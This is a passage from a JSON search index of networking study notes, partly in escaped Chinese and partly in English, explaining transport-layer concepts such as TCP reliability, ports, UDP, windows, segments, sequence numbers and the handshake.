<li>\u5ba2\u6237\u7aef\u76f4\u63a5\u53d1\u9001\u89c6\u9891\u6570\u636e\u5305\u5230\u670d\u52a1\u5668\uff08\u65e0\u8fde\u63a5\u5efa\u7acb\uff09\u3002  </li> <li>\u4e22\u5305\u65f6\u4e0d\u91cd\u4f20\uff0c\u7ee7\u7eed\u53d1\u9001\u540e\u7eed\u5e27\uff08\u907f\u514d\u5ef6\u8fdf\u7d2f\u79ef\uff09\u3002  </li> <li>\u63a5\u6536\u65b9\u901a\u8fc7\u7f13\u51b2\u548c\u63d2\u503c\u8865\u507f\u4e22\u5931\u7684\u5e27\u3002</li> </ol>"},{"location":"web/transform/#_6","title":"\u4e03\u3001\u5e38\u89c1\u95ee\u9898","text":""},{"location":"web/transform/#q1tcp","title":"Q1\uff1a\u4e3a\u4ec0\u4e48TCP\u63e1\u624b\u662f\u4e09\u6b21\uff0c\u6325\u624b\u662f\u56db\u6b21\uff1f","text":"<ul> <li>\u63e1\u624b\uff1a\u7b2c\u4e09\u6b21\u63e1\u624b\u53ef\u643a\u5e26\u6570\u636e\uff08\u63d0\u9ad8\u6548\u7387\uff09\uff0c\u4e14\u907f\u514d\u5386\u53f2\u8fde\u63a5\u5e72\u6270\u3002  </li> <li>\u6325\u624b\uff1a\u56e0TCP\u5168\u53cc\u5de5\uff0c\u9700\u5206\u522b\u5173\u95ed\u4e24\u4e2a\u65b9\u5411\u7684\u8fde\u63a5\u3002</li> </ul>"},{"location":"web/transform/#q2","title":"Q2\uff1a\u7aef\u53e3\u53f7\u662f\u552f\u4e00\u7684\u5417\uff1f","text":"<ul> <li>\u540c\u4e00\u4e3b\u673a\u5185\uff1a\u540c\u4e00\u65f6\u523b\u7684\u7aef\u53e3\u53f7\u4e0d\u80fd\u91cd\u590d\u4f7f\u7528\u3002  </li> <li>\u4e0d\u540c\u4e3b\u673a\uff1a\u53ef\u4ee5\u76f8\u540c\uff08\u5982\u4e24\u53f0\u7535\u8111\u5747\u53ef\u4f7f\u7528<code>54321</code>\u7aef\u53e3\u8bbf\u95eeWeb\uff09\u3002</li> </ul>"},{"location":"web/transform/#q3tcpudp","title":"Q3\uff1a\u5982\u4f55\u9009\u62e9TCP\u6216UDP\uff1f","text":"<ul> <li>\u9009TCP\uff1a\u9700\u53ef\u9760\u6027\uff08\u5982\u6587\u4ef6\u4e0b\u8f7d\u3001\u6570\u636e\u5e93\u540c\u6b65\uff09\u3002  </li> <li>\u9009UDP\uff1a\u9700\u4f4e\u5ef6\u8fdf\u6216\u5bb9\u5fcd\u4e22\u5305\uff08\u5982\u76f4\u64ad\u3001\u6e38\u620f\uff09\u3002  </li> </ul>"},{"location":"web/transform/#_7","title":"\u516b\u3001\u603b\u7ed3","text":"<p>\u4f20\u8f93\u5c42\u662f\u7f51\u7edc\u901a\u4fe1\u7684\u201c\u4ea4\u901a\u6307\u6325\u5b98\u201d\uff0c\u6838\u5fc3\u4ef7\u503c\u5728\u4e8e\uff1a 1. \u9694\u79bb\u7f51\u7edc\u5c42\u7684\u590d\u6742\u6027\uff0c\u4e3a\u5e94\u7528\u5c42\u63d0\u4f9b\u7b80\u5355\u63a5\u53e3\uff08\u5982<code>socket</code>\uff09\u3002 2. \u7075\u6d3b\u9002\u914d\u4e0d\u540c\u9700\u6c42\uff08\u53ef\u9760TCP vs \u9ad8\u6548UDP\uff09\u3002 3. \u4fdd\u969c\u6570\u636e\u6709\u5e8f\u3001\u5b8c\u6574\u4ea4\u4ed8\uff08\u6216\u727a\u7272\u53ef\u9760\u6027\u6362\u53d6\u5b9e\u65f6\u6027\uff09\u3002  </p> <p>\u7406\u89e3\u4f20\u8f93\u5c42\u662f\u4f18\u5316\u5e94\u7528\u6027\u80fd\uff08\u5982\u8c03\u6574TCP\u53c2\u6570\uff09\u548c\u89e3\u51b3\u7f51\u7edc\u95ee\u9898\uff08\u5982\u8fde\u63a5\u8d85\u65f6\uff09\u7684\u57fa\u7840\u3002</p>"},{"location":"web/transport/","title":"Transport","text":""},{"location":"web/transport/#transport_layer_principles","title":"Transport Layer Principles","text":""},{"location":"web/transport/#transport_layer_goals","title":"Transport Layer Goals","text":"<ul> <li>reliability</li> <li>demultiplexing</li> <li>flow control and congestion control</li> </ul>"},{"location":"web/transport/#reliability_absraction","title":"Reliability Absraction","text":"<p>Many applications require reliability. However, Layer 3 only provided unreliable, best-effort packet delivery. Packets can be lost (dropped), corrupted, and reordered. Packets can be delayed (e.g. a packet could stuck in a queue waiting to cross a link). In rare cases, packets can even be duplicated.</p> <p>For practical reasons, reliability is implemented at the end hosts, not at intermediate routers.  Also, reliability is implemented in the operating system for convenience, so that applications don\u2019t need to all re-implement their own reliability.</p> <p>We will formalize reliability by defining at-least-once delivery. In this model, the destination must receive every packet, without corruption, at least once, but may receive multiple duplicate copies of a packet. </p>"},{"location":"web/transport/#demultiplexing_with_ports","title":"Demultiplexing with Ports","text":"<p>Suppose that my personal computer has two applications that are both talking to the same server. When packets arrive at my personal computer, they have the same source IP address (server), and the same destination IP address (my computer). How can I tell which packets are meant for which application?</p> <p>In order to distinguish, or demultiplex, which packets are meant for which application, the transport layer header includes an additional port number, which can be used to identify a specific application on an end host.</p> <p>Because the transport layer is implemented in the operating system, these ports are the attachment point where the application connects to the operating system\u2019s network stack. The application knows its own port number, and the operating system knows the port numbers for all the applications, and the matching number is how data is unambiguously transferred between the application and operating system.</p> <p></p> <p>The modern Internet commonly uses the client-server design, where clients access services, and servers provide those services.  - Servers usually listen for requests on well-known ports (port numbers 0-1023). Clients know these ports and can access them to request services.    For example, application-level protocols with well-known port numbers include HTTP (port 80) and SSH (port 22). - By contrast, clients can select their own random port numbers (usually port numbers 1024-65535).    Client port numbers are ephemeral, because the port number can be abandoned after the connection is over, and does not need to be permanent.</p>"},{"location":"web/transport/#bytestream_abstraction","title":"Bytestream Abstraction","text":"<p>Implementing reliability at the transport layer means that the application developer no longer needs to think in terms of individual limited-size packets being sent across the network. Instead, the developer can think in terms of a reliable in-order bytestream. The sender has a stream of bytes with no length limit, and provides this stream to the transport layer. Then, the recipient receives the exact same stream of bytes, in the same order, with no bytes lost.</p>"},{"location":"web/transport/#udp_and_datagrams","title":"UDP and Datagrams","text":"<p>Applications that don\u2019t need reliability can use UDP (User Datagram Protocol)at the transport layer.  - UDP does not provide reliability guarantees. If the application needs a packet to arrive, the application must handle re-sending packets on its own (the transport layer will not re-send packets).  - Messages in UDP are limited to a single packet -- UDP datagram. If the application wants to send larger messages, the application is responsible for breaking up and reassembling those messages.  - Note that UDP still implements the notion of ports for demultiplexing, though.</p> TCP UDP demultiplexing demultiplexing bytestream abstraction datagram abstraction reliability -"},{"location":"web/transport/#tcp_design","title":"TCP Design","text":""},{"location":"web/transport/#reliably_delivering_a_single_packet","title":"Reliably Delivering a Single Packet","text":"<ul> <li>The time it takes for a packet to travel from sender to receiver is the one-way delay. </li> <li>The time it takes for a packet to travel from sender to receiver, plus the time for a reply packet to travel from receiver to sender, is the round-trip time (RTT).</li> </ul> <p>How does the sender know if the packet was successfully received?</p> <p>The receiver can send an acknowledgment (ack) message, confirming that the packet was received.</p> <p>What happens if the packet gets dropped? </p> <p>The sender can maintain a timer. When the timer expires, we can re-send the packet. When the sender receives an ack, the sender can cancel the timer.</p> <p>A good timer length would be the round-trip time. </p> <p>What happens if the ack is dropped?</p> <p>The destination received two copies of the packet. </p> <p>What if the bits are corrupted?</p> <p>We can add a checksum in the transport layer header (different from the IP layer checksum).  When the receiver sees a corrupt packet, it can do two things:  - Either the receiver can explicitly re-send a negative acknowledgement (nack), telling the sender to re-send the packet. - Or, the receiver can drop the corrupt packet and do nothing. Then, the sender will time out and re-send the packet.</p> <p>TCP uses the latter.</p> <p>What if the packets are delayed?</p> <p>If the delay is very long, the sender might time out before the ack arrives. The sender will re-send the packet (so the recipient might get two duplicates), and the sender might get two acks.</p> <p>What if the sender sends one packet, but it\u2019s duplicated in the network, and the recipient receives two copies?</p> <p>The recipient would send two acks, but both the sender and the recipient can safely handle duplicates.</p> <p>In summary, the single-packet reliability protocol is:</p> <p>If you are the sender: Send the packet, and set a timer. If no ack arrives before the timer goes off, re-send the packet and reset the timer. Stop and cancel the timer when the ack arrives.</p> <p>If you are the recipient: If you receive the uncorrupted packet, send an ack. </p> <p>This protocol guarantees at-least-once delivery.</p>"},{"location":"web/transport/#reliably_delivering_multiple_packets","title":"Reliably Delivering Multiple Packets","text":"<p>We could follow the same transmission rules (re-send when timer expires) for every single packet.  To distinguish packets, we can attach a unique sequence number to every packet. Each ack will be related to a specific packet. Sequence numbers can also help us reorder packets if they arrive out of order.</p> <p>When does the sender send each packet? </p> <p>The simplest approach is the stop and wait protocol, where the sender waits for packet i to be acknowledged before sending packet i+1. </p> <p>How can we make this faster? We can send packets in parallel. </p> <p>When a packet is sent, but its corresponding ack has not been received, we call that packet in flight.</p>"},{"location":"web/transport/#window-based_algorithms","title":"Window-Based Algorithms","text":"<p>We set a limit W and say that only W packets can be in flight at any given time. This is the key idea behind window-based protocols, where W is the size of the window.</p> <p>The sender can start by sending W packets. When an ack arrives, we send the next packet in line.</p>"},{"location":"web/transport/#window_size","title":"Window Size","text":"<p>How should W be selected?</p> <ul> <li>We want to fully use our available network capacity (\u201cfill the pipe\u201d). </li> <li>However, we don\u2019t want to overload links, since other people may be using that link (congestion control). </li> <li>We also don\u2019t want to overload the receiver, who needs to receive and process all the packets from the sender (flow control).</li> </ul>"},{"location":"web/transport/#fill_the_pipe","title":"Fill the Pipe","text":""},{"location":"web/transport/#tcp_implement","title":"TCP Implement","text":""},{"location":"web/transport/#tcp_segments","title":"TCP Segments","text":"<p>The application is relying on a bytestream abstraction, and is sending us a continuous stream of bytes. In order to form packets out of bytes in the bytestream, we\u2019ll introduce a unit of data called a TCP segment. </p> <p>The TCP implementation at the sender will collect bytes from the bytestream, one by one, and place those bytes into a TCP segment. When the TCP segment is full, we send that TCP segment, and then start a new TCP segment.</p> <p>Sometimes, the sender wants to send less data than the maximum segment size. In that case, we wouldn\u2019t want the TCP segment to be waiting forever for more bytes that never come. To fix this, we\u2019ll start a timer every time we start filling a new empty segment. If the timer expires, we\u2019ll send the TCP segment, even if it is not full yet.</p> <p></p> <p>Before sending the data in a TCP segment, the sender\u2019s TCP implementation will add a TCP header with relevant metadata (e.g. sequence number, port numbers). Then, the segment and header are passed down to the IP layer, which will attach an IP header and send the packet through the network. The TCP segment, with a TCP header and IP header on top, is sometimes called a TCP/IP packet. Equivalently, this is an IP packet whose payload consists of a TCP header and data.</p> <p></p> <p>How should the maximum segment size (MSS) be set? MSS (TCP segment limit) = MTU (IP packet limit) - IP header size - TCP header size</p>"},{"location":"web/transport/#sequence_numbers","title":"Sequence Numbers","text":"<p>In practice, instead of numbering individual segments, we assign a number to every byte in the bytestream.  Each segment\u2019s header will contain a sequence number corresponding to the number of the first byte in that segment.</p> <p>Each bytestream starts with an initial sequence number (ISN). The sender chooses an ISN and labels the first byte with number ISN+1, and so on.</p> <p>The acknowledgement number says, I have received all bytes up to, but not including, this number. </p> <p>Historically, the ISN was chosen to be random because the designers were concerned about ambiguous sequence numbers if all bytestreams started numbering at 0.  In practice, the ISN is chosen to be random for security reasons.</p>"},{"location":"web/transport/#tcp_state","title":"TCP State","text":"<p>In TCP, both the sender and recipient need to maintain state. - The sender has to remember which bytes have been sent but not acknowledged yet. The sender also has to keep track of various timers.</p> <ul> <li>The recipient has to remember the out-of-order bytes that can\u2019t be delivered to the application yet.</li> </ul> <p>Because TCP requires storing state, each bytestream is called a connection or session, and TCP is a connection-oriented protocol. TCP requires both parties to establish a connection and initialize state before data can be sent. TCP also needs a mechanism to tear down connections to free up the memory allocated for state on both end hosts.</p>"},{"location":"web/transport/#full_duplex","title":"Full Duplex","text":"<p>To support sending messages in both directions, TCP connections are full duplex. Instead of designating one sender and one recipient, both end hosts in the connection can send and receive data simultaneously, in the same connection.</p> <p>To support sending data in both directions, each TCP connection has two bytestreams: A to B, and B to A.</p> <p>Each packet can contain both data and acknowledgement information.  The sequence number would correspond to the sender\u2019s bytestream (the bytes I am sending). The acknowledgement number would correspond to the recipient\u2019s bytestream (the bytes I received from you).</p>"},{"location":"web/transport/#tcp_handshake","title":"TCP Handshake","text":"<p>To establish a TCP connection, the two hosts perform a three-way handshake to agree on the ISNs in each direction.</p>"},{"location":"web/transport/#ending_connections","title":"Ending Connections","text":""},{"location":"web/transport/#piggybacking","title":"Piggybacking","text":"<p>When the recipient gets a packet, if it has no data to send, the recipient has two choices.  - immediately send the ack, with no data to send - wait until it has some data to send, and then send the ack with the new data -- piggybacking</p>"},{"location":"web/transport/#sliding_window","title":"Sliding Window","text":""},{"location":"web/transport/#detecting_loss_and_re-sending_data","title":"Detecting Loss and Re-Sending Data","text":""}]}